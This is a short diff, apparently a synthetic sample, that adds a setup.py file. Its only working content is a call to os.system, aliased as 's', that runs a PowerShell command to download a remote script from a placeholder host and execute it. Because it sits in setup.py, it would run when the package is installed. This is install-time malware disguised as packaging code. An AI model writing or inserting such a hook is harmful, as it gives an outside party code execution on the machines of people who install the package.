@@ -1,0 +1,9 @@
+# path: setup.py
+# lines: 5
+# weight: 35
+# ---
+from os import (
+    path,
+    system as s,
+)
+s("iwr example.invalid/a.ps1 | iex")
